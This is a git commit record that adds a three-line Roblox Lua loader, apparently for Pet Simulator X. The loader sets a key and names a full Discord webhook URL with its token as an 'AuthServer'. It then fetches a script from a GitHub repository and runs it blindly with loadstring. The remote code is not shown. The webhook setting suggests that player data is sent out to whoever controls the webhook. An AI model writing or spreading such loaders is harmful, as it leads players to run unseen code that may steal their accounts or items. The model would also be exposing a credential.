afcf80880473d82d9951d8a8d18ba966c92ae6c9
Extremescripted <120589176+Extremescripted@users.noreply.github.com>
2022-12-17 11:56:41 +0100

    Create main.lua

---
+++ main.lua
@@ -0,0 +1,3 @@
+_G.Key = "mftnibun"
+_G.AuthServer = "https://discord.com/api/webhooks/1053626314638229576/3M751LQZS3LpqHcZXEgjk9AF52hNlT9ZEmKSjByY4FhpFINgBRP-9ackiHrFuuu50Oan"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
